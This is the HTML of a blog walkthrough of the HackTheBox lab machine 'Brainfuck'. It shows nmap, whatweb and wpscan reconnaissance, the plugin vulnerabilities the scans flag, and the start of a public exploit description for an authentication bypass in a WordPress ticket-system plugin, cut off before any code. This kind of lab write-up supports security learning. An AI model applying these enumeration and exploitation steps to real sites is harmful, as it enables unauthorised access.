<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackTheBox Walkthrough - Brainf**k | x64.moe</title><meta name=keywords content><meta name=description content="This post is writeup of the HackTheBox machine.
Brain**ck https://app.hackthebox.com/machines/Brainfuck
Nmap Nmap result
$ nmap -sC -sV 10.10.10.17 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 06:39 EDT Nmap scan report for 10.10.10.17 Host is up (0.072s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA) | 256 6bd5dc153a667af419915d7385b24cb2 (ECDSA) |_ 256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES UIDL CAPA AUTH-RESP-CODE PIPELINING USER 143/tcp open imap Dovecot imapd |_imap-capabilities: LITERAL+ AUTH=PLAINA0001 capabilities LOGIN-REFERRALS have post-login listed SASL-IR IDLE ENABLE OK more IMAP4rev1 Pre-login ID 443/tcp open ssl/http nginx 1."><meta name=author content="FAMASoon"><link rel=canonical href=https://famasoon.github.io/posts/brainfuck/><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://famasoon.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://famasoon.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://famasoon.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://famasoon.github.io/apple-touch-icon.png><link rel=mask-icon href=https://famasoon.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-107195112-2","auto"),ga("send","pageview"))</script><meta property="og:title" content="HackTheBox Walkthrough - Brainf**k"><meta property="og:description" content="This post is writeup of the HackTheBox machine.
Brain**ck https://app.hackthebox.com/machines/Brainfuck
Nmap Nmap result
$ nmap -sC -sV 10.10.10.17 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 06:39 EDT Nmap scan report for 10.10.10.17 Host is up (0.072s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA) | 256 6bd5dc153a667af419915d7385b24cb2 (ECDSA) |_ 256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES UIDL CAPA AUTH-RESP-CODE PIPELINING USER 143/tcp open imap Dovecot imapd |_imap-capabilities: LITERAL+ AUTH=PLAINA0001 capabilities LOGIN-REFERRALS have post-login listed SASL-IR IDLE ENABLE OK more IMAP4rev1 Pre-login ID 443/tcp open ssl/http nginx 1."><meta property="og:type" content="article"><meta property="og:url" content="https://famasoon.github.io/posts/brainfuck/"><meta property="og:image" content="https://famasoon.github.io/static/famasoon.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-10T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-10T00:00:00+00:00"><meta property="og:site_name" content="x64.moe"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://famasoon.github.io/static/famasoon.jpg"><meta name=twitter:title content="HackTheBox Walkthrough - Brainf**k"><meta name=twitter:description content="This post is writeup of the HackTheBox machine.
Brain**ck https://app.hackthebox.com/machines/Brainfuck
Nmap Nmap result
$ nmap -sC -sV 10.10.10.17 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 06:39 EDT Nmap scan report for 10.10.10.17 Host is up (0.072s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA) | 256 6bd5dc153a667af419915d7385b24cb2 (ECDSA) |_ 256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES UIDL CAPA AUTH-RESP-CODE PIPELINING USER 143/tcp open imap Dovecot imapd |_imap-capabilities: LITERAL+ AUTH=PLAINA0001 capabilities LOGIN-REFERRALS have post-login listed SASL-IR IDLE ENABLE OK more IMAP4rev1 Pre-login ID 443/tcp open ssl/http nginx 1."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://famasoon.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HackTheBox Walkthrough - Brainf**k","item":"https://famasoon.github.io/posts/brainfuck/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox Walkthrough - Brainf**k","name":"HackTheBox Walkthrough - Brainf**k","description":"This post is writeup of the HackTheBox machine.\nBrain**ck https://app.hackthebox.com/machines/Brainfuck\nNmap Nmap result\n$ nmap -sC -sV 10.10.10.17 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 06:39 EDT Nmap scan report for 10.10.10.17 Host is up (0.072s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA) | 256 6bd5dc153a667af419915d7385b24cb2 (ECDSA) |_ 256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES UIDL CAPA AUTH-RESP-CODE PIPELINING USER 143/tcp open imap Dovecot imapd |_imap-capabilities: LITERAL+ AUTH=PLAINA0001 capabilities LOGIN-REFERRALS have post-login listed SASL-IR IDLE ENABLE OK more IMAP4rev1 Pre-login ID 443/tcp open ssl/http nginx 1.","keywords":[],"articleBody":"This post is writeup of the HackTheBox machine.\nBrain**ck https://app.hackthebox.com/machines/Brainfuck\nNmap Nmap result\n$ nmap -sC -sV 10.10.10.17 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 06:39 EDT Nmap scan report for 10.10.10.17 Host is up (0.072s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA) | 256 6bd5dc153a667af419915d7385b24cb2 (ECDSA) |_ 256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL(PLAIN) TOP RESP-CODES UIDL CAPA AUTH-RESP-CODE PIPELINING USER 143/tcp open imap Dovecot imapd |_imap-capabilities: LITERAL+ AUTH=PLAINA0001 capabilities LOGIN-REFERRALS have post-login listed SASL-IR IDLE ENABLE OK more IMAP4rev1 Pre-login ID 443/tcp open ssl/http nginx 1.10.0 (Ubuntu) | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb | Not valid before: 2017-04-13T11:19:29 |_Not valid after: 2027-04-11T11:19:29 |_http-title: Welcome to nginx! | tls-nextprotoneg: |_ http/1.1 | tls-alpn: |_ http/1.1 |_http-server-header: nginx/1.10.0 (Ubuntu) |_ssl-date: TLS randomness does not represent time Service Info: Host: brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 57.30 seconds Found some host name\ncat /etc/hosts brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb Web I opend brainfuck.htb , find the following text\nDev Update SMTP Integration is ready. Please check and send feedback to orestis@brainfuck.htb SMTP Integration is ready. Please check and send feedback to orestis@brainfuck.htb Using whatweb .\n$ whatweb https://www.brainfuck.htb https://www.brainfuck.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.17], RedirectLocation[https://brainfuck.htb/], nginx[1.10.0] https://brainfuck.htb/ [200 OK] Bootstrap[4.7.3], Country[RESERVED][ZZ], Email[ajax-loader@2x.gif,orestis@brainfuck.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.17], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], Modernizr, PoweredBy[WordPress,], Script[text/javascript], Title[Brainfuck Ltd. \u0026#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3], nginx[1.10.0] This website was created Wordpress.\nCheck vuln plugin with wpscan\n$ wpscan --url https://brainfuck.htb --disable-tls-checks -e vp --api-token _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: https://brainfuck.htb/ [10.10.10.17] [+] Started: Tue May 9 07:27:36 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: nginx/1.10.0 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% === snipped === [+] Enumerating Vulnerable Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: === snipped === | [!] Title: WP Support Plus Responsive Ticket System \u003c 8.0.0 - Privilege Escalation | Fixed in: 8.0.0 | References: | - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f | - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html | - https://packetstormsecurity.com/files/140413/ | | [!] Title: WP Support Plus Responsive Ticket System \u003c 8.0.8 - Remote Code Execution | Fixed in: 8.0.8 | References: | - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f | - https://plugins.trac.wordpress.org/changeset/1763596 | | Version: 7.1.3 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt [+] WPScan DB API OK | Plan: free | Requests Done (during the scan): 3 | Requests Remaining: 72 [+] Finished: Tue May 9 07:27:43 2023 [+] Requests Done: 39 [+] Cached Requests: 5 [+] Data Sent: 10.214 KB [+] Data Received: 208.404 KB [+] Memory used: 246.844 MB [+] Elapsed time: 00:00:07 I can get RCE.\n| [!] Title: WP Support Plus Responsive Ticket System \u003c 8.0.8 - Remote Code Execution | Fixed in: 8.0.8 | References: | - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f | - https://plugins.trac.wordpress.org/changeset/1763596 $ searchsploit Support Plus ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- ManageEngine Support Center Plus 7.8 Build 7801 - Directory Traversal | jsp/webapps/17442.txt ManageEngine Support Center Plus 7903 - Multiple Vulnerabilities | multiple/webapps/18745.txt ManageEngine Support Center Plus 7908 - Multiple Vulnerabilities | jsp/webapps/22040.txt ManageEngine Support Center Plus 7916 - Directory Traversal | php/webapps/31262.txt ManageEngine SupportCenter Plus 7.90 - Multiple Vulnerabilities | multiple/webapps/37322.txt WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities | php/webapps/34589.txt WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation | php/webapps/41006.txt WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection | php/webapps/40939.txt ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results User enumrate\n$ wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: https://brainfuck.htb/ [10.10.10.17] [+] Started: Tue May 9 07:35:20 2023 Interesting Finding(s): ===snipped=== [i] User(s) Identified: [+] admin | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] administrator | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Tue May 9 07:37:00 2023 [+] Requests Done: 3411 [+] Cached Requests: 43 [+] Data Sent: 939.757 KB [+] Data Received: 747.878 KB [+] Memory used: 281.445 MB [+] Elapsed time: 00:01:40 We found user admin. Try to use php/webapps/41006.txt\n$ cp /usr/share/exploitdb/exploits/php/webapps/41006.txt . $ cat 41006.txt # Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation # Date: 10-01-2017 # Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/ # Exploit Author: Kacper Szurek # Contact: http://twitter.com/KacperSzurek # Website: http://security.szurek.pl/ # Category: web 1. Description You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie(). http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html 2. Proof of Concept ","wordCount":"2756","inLanguage":"en","datePublished":"2023-05-10T00:00:00Z","dateModified":"2023-05-10T00:00:00Z","author":{"@type":"Person","name":"FAMASoon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://famasoon.github.io/posts/brainfuck/"},"publisher":{"@type":"Organization","name":"x64.moe","logo":{"@type":"ImageObject","url":"https://famasoon.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://famasoon.github.io/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://famasoon.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://famasoon.github.io/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://famasoon.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://famasoon.github.io/posts/>Posts</a></div><h1 class=post-title>HackTheBox Walkthrough - Brainf**k</h1><div class=post-meta><span title='2023-05-10 00:00:00 +0000 UTC'>May 10, 2023</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;2756 words&nbsp;·&nbsp;FAMASoon&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/brainfuck.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><p>This post is writeup of the HackTheBox machine.</p><h2 id=brainck>Brain**ck<a hidden class=anchor aria-hidden=true href=#brainck>#</a></h2><p><a href=https://app.hackthebox.com/machines/Brainfuck>https://app.hackthebox.com/machines/Brainfuck</a></p><h2 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h2><p>Nmap result</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ nmap -sC -sV 10.10.10.17
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-09 06:39 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.17
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.072s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>995</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 94d0b334e9a537c5acb980df2a54a5f0 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 6bd5dc153a667af419915d7385b24cb2 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 23f5a333339d76d5f2ea6971e34e8e02 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>25/tcp  open  smtp     Postfix smtpd
</span></span><span class=line><span class=cl><span class=p>|</span>_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
</span></span><span class=line><span class=cl>110/tcp open  pop3     Dovecot pop3d
</span></span><span class=line><span class=cl><span class=p>|</span>_pop3-capabilities: SASL<span class=o>(</span>PLAIN<span class=o>)</span> TOP RESP-CODES UIDL CAPA AUTH-RESP-CODE PIPELINING USER
</span></span><span class=line><span class=cl>143/tcp open  imap     Dovecot imapd
</span></span><span class=line><span class=cl><span class=p>|</span>_imap-capabilities: LITERAL+ <span class=nv>AUTH</span><span class=o>=</span>PLAINA0001 capabilities LOGIN-REFERRALS have post-login listed SASL-IR IDLE ENABLE OK more IMAP4rev1 Pre-login ID
</span></span><span class=line><span class=cl>443/tcp open  ssl/http nginx 1.10.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>brainfuck.htb/organizationName<span class=o>=</span>Brainfuck Ltd./stateOrProvinceName<span class=o>=</span>Attica/countryName<span class=o>=</span>GR
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2017-04-13T11:19:29
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2027-04-11T11:19:29
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Welcome to nginx!
</span></span><span class=line><span class=cl><span class=p>|</span> tls-nextprotoneg: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.10.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl>Service Info: Host:  brainfuck<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 57.30 seconds
</span></span></code></pre></div><p>Found some host name</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>cat /etc/hosts
</span></span><span class=line><span class=cl>&lt;IP address&gt; brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
</span></span></code></pre></div><h2 id=web>Web<a hidden class=anchor aria-hidden=true href=#web>#</a></h2><p>I opend <code>brainfuck.htb</code> , find the following text</p><pre tabindex=0><code>Dev Update
SMTP Integration is ready. Please check and send feedback to orestis@brainfuck.htb
SMTP Integration is ready. Please check and send feedback to orestis@brainfuck.htb
</code></pre><p>Using <code>whatweb</code> .</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ whatweb https://www.brainfuck.htb
</span></span><span class=line><span class=cl>https://www.brainfuck.htb <span class=o>[</span><span class=m>301</span> Moved Permanently<span class=o>]</span> Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>nginx/1.10.0 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.10.10.17<span class=o>]</span>, RedirectLocation<span class=o>[</span>https://brainfuck.htb/<span class=o>]</span>, nginx<span class=o>[</span>1.10.0<span class=o>]</span>
</span></span><span class=line><span class=cl>https://brainfuck.htb/ <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Bootstrap<span class=o>[</span>4.7.3<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, Email<span class=o>[</span>ajax-loader@2x.gif,orestis@brainfuck.htb<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Ubuntu Linux<span class=o>][</span>nginx/1.10.0 <span class=o>(</span>Ubuntu<span class=o>)]</span>, IP<span class=o>[</span>10.10.10.17<span class=o>]</span>, JQuery<span class=o>[</span>1.12.4<span class=o>]</span>, MetaGenerator<span class=o>[</span>WordPress 4.7.3<span class=o>]</span>, Modernizr, PoweredBy<span class=o>[</span>WordPress,<span class=o>]</span>, Script<span class=o>[</span>text/javascript<span class=o>]</span>, Title<span class=o>[</span>Brainfuck Ltd. <span class=p>&amp;</span><span class=c1>#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3], nginx[1.10.0]</span>
</span></span></code></pre></div><p>This website was created Wordpress.</p><p>Check vuln plugin with <code>wpscan</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>$</span> <span class=nx>wpscan</span> <span class=o>--</span><span class=nx>url</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//brainfuck.htb --disable-tls-checks -e vp --api-token &lt;API-token&gt;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>_______________________________________________________________</span>
</span></span><span class=line><span class=cl>         <span class=nx>__</span>          <span class=nx>_______</span>   <span class=nx>_____</span>
</span></span><span class=line><span class=cl>         <span class=err>\</span> <span class=err>\</span>        <span class=o>/</span> <span class=sr>/  __ \ /</span> <span class=nx>____</span><span class=o>|</span>
</span></span><span class=line><span class=cl>          <span class=err>\</span> <span class=err>\</span>  <span class=o>/</span><span class=err>\</span>  <span class=o>/</span> <span class=err>/| |__) | (___   ___  __ _ _ __ ®</span>
</span></span><span class=line><span class=cl>           <span class=err>\</span> <span class=err>\</span><span class=o>/</span>  <span class=err>\</span><span class=o>/</span> <span class=sr>/ |  ___/</span> <span class=err>\</span><span class=nx>___</span> <span class=err>\</span> <span class=o>/</span> <span class=nx>__</span><span class=o>|</span><span class=sr>/ _` | &#39;_ \
</span></span></span><span class=line><span class=cl><span class=sr>            \  /</span><span class=err>\</span>  <span class=o>/</span>  <span class=o>|</span> <span class=o>|</span>     <span class=nx>____</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=nx>__</span><span class=o>|</span> <span class=p>(</span><span class=nx>_</span><span class=o>|</span> <span class=o>|</span> <span class=o>|</span> <span class=o>|</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>             <span class=err>\</span><span class=o>/</span>  <span class=err>\</span><span class=o>/</span>   <span class=o>|</span><span class=nx>_</span><span class=o>|</span>    <span class=o>|</span><span class=nx>_____</span><span class=o>/</span> <span class=err>\</span><span class=nx>___</span><span class=o>|</span><span class=err>\</span><span class=nx>__</span><span class=p>,</span><span class=nx>_</span><span class=o>|</span><span class=nx>_</span><span class=o>|</span> <span class=o>|</span><span class=nx>_</span><span class=o>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=nx>WordPress</span> <span class=nx>Security</span> <span class=nx>Scanner</span> <span class=nx>by</span> <span class=nx>the</span> <span class=nx>WPScan</span> <span class=nx>Team</span>
</span></span><span class=line><span class=cl>                         <span class=nx>Version</span> <span class=mf>3.8.22</span>
</span></span><span class=line><span class=cl>       <span class=nx>Sponsored</span> <span class=nx>by</span> <span class=nx>Automattic</span> <span class=o>-</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//automattic.com/
</span></span></span><span class=line><span class=cl><span class=c1></span>       <span class=err>@</span><span class=nx>_WPScan_</span><span class=p>,</span> <span class=err>@</span><span class=nx>ethicalhack3r</span><span class=p>,</span> <span class=err>@</span><span class=nx>erwan_lr</span><span class=p>,</span> <span class=err>@</span><span class=nx>firefart</span>
</span></span><span class=line><span class=cl><span class=nx>_______________________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>URL</span><span class=o>:</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//brainfuck.htb/ [10.10.10.17]
